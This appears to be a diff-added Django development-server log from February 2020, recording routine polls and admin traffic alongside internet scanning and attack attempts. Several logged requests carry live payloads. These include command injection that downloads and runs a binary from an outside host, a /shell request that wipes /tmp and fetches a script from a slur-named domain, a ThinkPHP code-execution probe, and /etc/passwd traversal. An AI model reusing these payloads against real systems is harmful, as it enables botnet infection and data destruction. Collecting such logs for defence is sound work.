+[09/Feb/2020 17:12:29] "GET /card_scan_decoder.php?No=30&door=%60wget http://switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear%60 HTTP/1.1" 400 -
+[09/Feb/2020 17:12:33] code 400, message Bad request syntax ('GET /card_scan_decoder.php?No=30&door=%60wget http://switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear%60 HTTP/1.1')
+[09/Feb/2020 17:12:33] "GET /card_scan_decoder.php?No=30&door=%60wget http://switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear%60 HTTP/1.1" 400 -
+----------------------------------------
+Exception happened during processing of request from ('63.143.35.230', 58500)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /robots.txt
+[09/Feb/2020 18:23:18] "HEAD /robots.txt HTTP/1.0" 404 2077
+Not Found: /
+[09/Feb/2020 18:31:59] "GET / HTTP/1.1" 404 2030
+Not Found: /shell
+[09/Feb/2020 19:31:58] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://jhasdjahsdjasfkdaskdfasBOT.niggacumyafacenet.xyz/jaws;sh+/tmp/jaws HTTP/1.1" 404 2154
+Not Found: /
+[09/Feb/2020 19:56:48] "GET / HTTP/1.1" 404 2027
+Not Found: /TP/public/index.php
+[09/Feb/2020 20:58:39] "GET /TP/public/index.php HTTP/1.1" 404 2102
+Not Found: /TP/index.php
+[09/Feb/2020 20:58:39] "GET /TP/index.php HTTP/1.1" 404 2081
+Not Found: /thinkphp/html/public/index.php
+[09/Feb/2020 20:58:39] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 2135
+Not Found: /html/public/index.php
+[09/Feb/2020 20:58:39] "GET /html/public/index.php HTTP/1.1" 404 2108
+Not Found: /public/index.php
+[09/Feb/2020 20:58:39] "GET /public/index.php HTTP/1.1" 404 2093
+Not Found: /TP/html/public/index.php
+[09/Feb/2020 20:58:39] "GET /TP/html/public/index.php HTTP/1.1" 404 2117
+Not Found: /elrekt.php
+[09/Feb/2020 20:58:39] "GET /elrekt.php HTTP/1.1" 404 2075
+Not Found: /index.php
+[09/Feb/2020 20:58:39] "GET /index.php HTTP/1.1" 404 2072
+Not Found: /
+[09/Feb/2020 20:58:39] "GET / HTTP/1.1" 404 2030
+[09/Feb/2020 21:22:09] "GET /admin/ HTTP/1.1" 200 5901
+[09/Feb/2020 21:22:09] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[09/Feb/2020 21:22:09] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[09/Feb/2020 21:22:09] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[09/Feb/2020 21:22:10] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[09/Feb/2020 21:22:10] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[09/Feb/2020 21:22:10] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 304 0
+[09/Feb/2020 21:22:10] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[09/Feb/2020 21:22:10] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[09/Feb/2020 21:22:10] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[09/Feb/2020 21:22:10] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[09/Feb/2020 21:22:10] "GET /favicon.ico HTTP/1.1" 404 2078
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 12908)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 12909)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 12911)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 12907)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 12906)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 12910)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[09/Feb/2020 21:31:59] "GET /polls/3 HTTP/1.1" 301 0
+[09/Feb/2020 21:31:59] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 21:32:58] "GET /admin HTTP/1.1" 301 0
+[09/Feb/2020 21:32:58] "GET /polls/3 HTTP/1.1" 301 0
+Not Found: /shell
+[09/Feb/2020 21:56:14] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://jhasdjahsdjasfkdaskdfasBOT.niggacumyafacenet.xyz/jaws;sh+/tmp/jaws HTTP/1.1" 404 2154
+Not Found: /
+[09/Feb/2020 22:23:44] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[09/Feb/2020 23:03:33] "GET / HTTP/1.0" 404 2028
+Not Found: /
+[09/Feb/2020 23:03:33] "OPTIONS / HTTP/1.0" 404 2032
+[09/Feb/2020 23:03:34] code 400, message Bad request version ('RTSP/1.0')
+[09/Feb/2020 23:03:34] "OPTIONS / RTSP/1.0" 400 -
+[09/Feb/2020 23:03:39] code 400, message Bad HTTP/0.9 request type ('l\x00')
+[09/Feb/2020 23:03:39] "l          " 400 -
+Not Found: /nice ports,/Trinity.txt.bak
+[09/Feb/2020 23:03:39] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 404 2129
+[09/Feb/2020 23:03:44] code 400, message Bad request version ('\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+[09/Feb/2020 23:03:44] "  (rþ          |                    " 400 -
+[09/Feb/2020 23:03:49] code 400, message Bad HTTP/0.9 request type ('\x00')
+[09/Feb/2020 23:03:49] "          versionbind   " 400 -
+[09/Feb/2020 23:03:54] code 400, message Bad HTTP/0.9 request type ('\x00')
+[09/Feb/2020 23:03:54] "            " 400 -
+[09/Feb/2020 23:03:54] code 400, message Bad request syntax ('HELP')
+[09/Feb/2020 23:03:54] "HELP" 400 -
+[09/Feb/2020 23:03:54] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G×÷º,îê²`~ó\x00ý\x82{¹Õ\x96Èw\x9bæÄÛ<=Ûoï\x10n\x00\x00(\x00\x16\x00\x13\x00')
+[09/Feb/2020 23:03:54] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[09/Feb/2020 23:03:54] code 400, message Bad request version ('\x00/\x00')
+[09/Feb/2020 23:03:54] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[09/Feb/2020 23:03:54] code 400, message Bad request syntax ('\x00\x00\x00qj\x81n0\x81k¡\x03\x02\x01\x05¢\x03\x02\x01')
+[09/Feb/2020 23:03:54] "   qjn0k¡¢" 400 -
+[09/Feb/2020 23:03:59] code 400, message Bad request syntax ('\x00\x00\x00¤ÿSMBr\x00\x00\x00\x00\x08\x01@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x06\x00\x00\x01\x00\x00\x81\x00\x02PC NETWORK PROGRAM 1.0\x00\x02MICROSOFT NETWORKS 1.03\x00\x02MICROSOFT NETWORKS 3.0\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02Samba\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00')
+[09/Feb/2020 23:03:59] "   ¤ÿSMBr    @              @     PC NETWORK PROGRAM 1.0 MICROSOFT NETWORKS 1.03 MICROSOFT NETWORKS 3.0 LANMAN1.0 LM1.2X002 Samba NT LANMAN 1.0 NT LM 0.12 " 400 -
+[09/Feb/2020 23:03:59] code 400, message Bad request syntax ('\x01default')
+[09/Feb/2020 23:03:59] "default" 400 -
+[09/Feb/2020 23:03:59] code 400, message Bad request syntax ('0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00')
+[09/Feb/2020 23:03:59] "0   -c   $ " 400 -
+[09/Feb/2020 23:04:04] code 400, message Bad HTTP/0.9 request type ('0')
+[09/Feb/2020 23:04:04] "0`  " 400 -
+[09/Feb/2020 23:04:04] code 400, message Bad request version ('SIP/2.0')
+[09/Feb/2020 23:04:04] "OPTIONS sip:nm SIP/2.0" 400 -
+[09/Feb/2020 23:04:09] code 400, message Bad request syntax ('TNMP\x04\x00\x00\x00TNME\x00\x00\x04\x00')
+[09/Feb/2020 23:04:09] "TNMP   TNME   " 400 -
+[09/Feb/2020 23:04:14] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00')
+[09/Feb/2020 23:04:14] "  à     " 400 -
+[09/Feb/2020 23:04:19] code 400, message Bad request syntax ('DmdT\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x11\x11\x00ÿ\x01ÿ\x13')
+[09/Feb/2020 23:04:19] "DmdT           ÿÿ" 400 -
+[09/Feb/2020 23:04:24] code 400, message Bad HTTP/0.9 request type (':\x00\x00\x00/\x00\x00\x00\x02\x00\x00@\x02\x0f\x00\x01\x00=\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/\x00\x00\x00\x00\x00\x00\x00\x00\x00@')
+[09/Feb/2020 23:04:24] ":   /     @  =            /         @                 " 400 -
+[09/Feb/2020 23:04:29] code 400, message Bad request syntax ('JRMI\x00\x02K')
+[09/Feb/2020 23:04:29] "JRMI K" 400 -
+[09/Feb/2020 23:04:34] code 400, message Bad request syntax ('\x01\x00\x00ýÎú\x0b°\xa0\x00\x00\x00MMS\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x03\x00ðððð\x0b\x00\x04\x00\x1c\x00\x03\x00N\x00S\x00P\x00l\x00a\x00y\x00e\x00r\x00/\x009\x00.\x000\x00.\x000\x00.\x002\x009\x008\x000\x00;\x00 \x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_')
+[09/Feb/2020 23:04:34] "  ýÎú°    MMS                    ðððð    N S P l a y e r / 9 . 0 . 0 . 2 9 8 0 ;   { 0 0 0 0 A A 0 0 - 0 A 0 0 - 0 0 a 0 - A A 0 A - 0 0 0 0 A 0 A A 0 A A 0 }   àmß_" 400 -
+[09/Feb/2020 23:04:39] code 400, message Bad HTTP/0.9 request type ('\x00Z\x00\x00\x01\x00\x00\x00\x016\x01,\x00\x00\x08\x00\x7fÿ\x7f\x08\x00\x00\x00\x01\x00')
+[09/Feb/2020 23:04:39] " Z     6,   ÿ      :                4æ           (CONNECT_DATA=(COMMAND=version))" 400 -
+[09/Feb/2020 23:04:44] code 400, message Bad request version ('\x03\x00(\x00\x04ÿ\x08\x00\x01U\x00\x00\x00MSSQLServer\x00H\x0f\x00\x00')
+[09/Feb/2020 23:04:44] " 4            ( ÿ U   MSSQLServer H  " 400 -
+[09/Feb/2020 23:04:49] code 400, message Bad request syntax ('\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x0f\x00')
+[09/Feb/2020 23:04:49] "              " 400 -
+[09/Feb/2020 23:04:54] code 400, message Bad request syntax ('GIOP\x01\x00\x01\x00$\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00abcdef\x00\x00\x04\x00\x00\x00get\x00\x00\x00\x00\x00')
+[09/Feb/2020 23:04:54] "GIOP  $                abcdef     get     " 400 -
+[09/Feb/2020 23:04:57] code 400, message Bad HTTP/0.9 request type ('t3')
+[09/Feb/2020 23:04:57] "t3 12.1.2" 400 -
+Not Found: /sdk
+[09/Feb/2020 23:04:57] "POST /sdk HTTP/1.1" 404 2055
+Not Found: /
+[09/Feb/2020 23:04:57] "GET / HTTP/1.1" 404 2027
+Not Found: /nmaplowercheck1581260697
+[09/Feb/2020 23:04:57] "GET /nmaplowercheck1581260697 HTTP/1.1" 404 2117
+Not Found: /HNAP1
+[09/Feb/2020 23:04:57] "GET /HNAP1 HTTP/1.1" 404 2060
+Not Found: /evox/about
+[09/Feb/2020 23:04:57] "GET /evox/about HTTP/1.1" 404 2075
+[09/Feb/2020 23:05:07] code 400, message Bad request version ('M[¨\x00\x00Ú\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00')
+[09/Feb/2020 23:05:07] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[09/Feb/2020 23:05:07] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x036ì¥\x10¢~&ð\x92×\x9drâv\x96\xad¼1\x0f{>èóDw\x8a§(/0\x94!\x00\x00Ú\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00')
+[09/Feb/2020 23:05:07] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[09/Feb/2020 23:05:08] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[09/Feb/2020 23:36:03] "GET / HTTP/1.1" 404 2030
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[09/Feb/2020 23:37:11] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
+----------------------------------------
+Exception happened during processing of request from ('80.82.70.187', 41939)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[09/Feb/2020 23:37:12] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
+----------------------------------------
+Exception happened during processing of request from ('80.82.70.187', 42565)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[10/Feb/2020 01:06:29] "GET / HTTP/1.1" 404 2030
+Not Found: /shell
+[10/Feb/2020 01:06:50] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://jhasdjahsdjasfkdaskdfasBOT.niggacumyafacenet.xyz/jaws;sh+/tmp/jaws HTTP/1.1" 404 2154
+Not Found: /
+[10/Feb/2020 04:06:52] "GET / HTTP/1.1" 404 2030
+[10/Feb/2020 04:07:26] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+[10/Feb/2020 04:07:26] "  à          " 400 -
+Not Found: /
+[10/Feb/2020 04:17:24] "GET / HTTP/1.1" 404 2028
+Not Found: /
+[10/Feb/2020 04:19:40] "GET / HTTP/1.1" 404 2027
+Not Found: /ip.ws.126.net:443
+[10/Feb/2020 05:30:45] "CONNECT ip.ws.126.net:443 HTTP/1.1" 404 1670
+Not Found: /
+[10/Feb/2020 06:10:13] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[10/Feb/2020 06:10:14] "GET / HTTP/1.1" 404 2028
+Not Found: /
+[10/Feb/2020 06:12:28] "GET / HTTP/1.0" 404 2028
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[10/Feb/2020 09:19:21] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
+----------------------------------------
+Exception happened during processing of request from ('80.82.70.187', 34820)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[10/Feb/2020 10:16:13] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[10/Feb/2020 11:44:29] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[10/Feb/2020 11:47:41] "GET / HTTP/1.1" 404 2027
+Not Found: /manager/text/list
+[10/Feb/2020 12:20:28] "GET /manager/text/list HTTP/1.1" 404 2096
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /
+[10/Feb/2020 13:57:40] "GET / HTTP/1.1" 400 60616
+Not Found: /
+[10/Feb/2020 14:09:34] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[10/Feb/2020 14:22:53] "GET / HTTP/1.0" 404 2028
+Not Found: /
+[10/Feb/2020 15:55:05] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[10/Feb/2020 15:55:06] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[10/Feb/2020 16:35:24] "GET / HTTP/1.1" 404 2030
+Not Found: /_async/AsyncResponseService
+[10/Feb/2020 17:17:01] "GET /_async/AsyncResponseService HTTP/1.1" 404 2126
+Not Found: /
+[10/Feb/2020 17:43:31] "GET / HTTP/1.1" 404 2030
+Not Found: /http:/clientapi.ipip.net/echo.php
+[10/Feb/2020 18:59:05] "GET http://clientapi.ipip.net/echo.php?info=1234567890 HTTP/1.1" 404 1733
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[10/Feb/2020 19:01:15] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
+----------------------------------------
+Exception happened during processing of request from ('80.82.70.187', 41543)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[10/Feb/2020 21:17:35] "GET / HTTP/1.1" 404 2030
+Not Found: /robots.txt
+[10/Feb/2020 21:19:35] "HEAD /robots.txt HTTP/1.0" 404 2077
+[10/Feb/2020 21:53:22] "GET /polls HTTP/1.1" 301 0
+[10/Feb/2020 21:53:22] "GET /polls/3 HTTP/1.1" 301 0
+[10/Feb/2020 21:54:24] "GET /polls/3 HTTP/1.1" 301 0
+[10/Feb/2020 21:54:24] "GET /polls/3/ HTTP/1.1" 200 582
+[10/Feb/2020 21:54:24] "GET /polls HTTP/1.1" 301 0
+[10/Feb/2020 21:54:25] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /
+[10/Feb/2020 22:27:33] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[10/Feb/2020 23:09:51] "GET / HTTP/1.1" 404 2027
+Not Found: /../../../../../../../../../../../../../../../../../../etc/passwd
+[10/Feb/2020 23:44:22] "GET /../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 2183
+Not Found: /ip.ws.126.net:443
+[11/Feb/2020 02:04:37] "CONNECT ip.ws.126.net:443 HTTP/1.1" 404 1670
+----------------------------------------
+Exception happened during processing of request from ('63.143.35.230', 49435)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /robots.txt
+[11/Feb/2020 02:43:17] "HEAD /robots.txt HTTP/1.0" 404 2077
+[11/Feb/2020 04:08:59] code 400, message Bad request syntax ('GET /public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=netstat  -an HTTP/1.1')
+[11/Feb/2020 04:08:59] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=netstat  -an HTTP/1.1" 400 -
+Not Found: /
+[11/Feb/2020 04:12:19] "GET / HTTP/1.1" 404 2027
+----------------------------------------
+Exception happened during processing of request from ('100.4.189.120', 41167)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[11/Feb/2020 04:40:48] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
+----------------------------------------
+Exception happened during processing of request from ('80.82.70.187', 37615)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
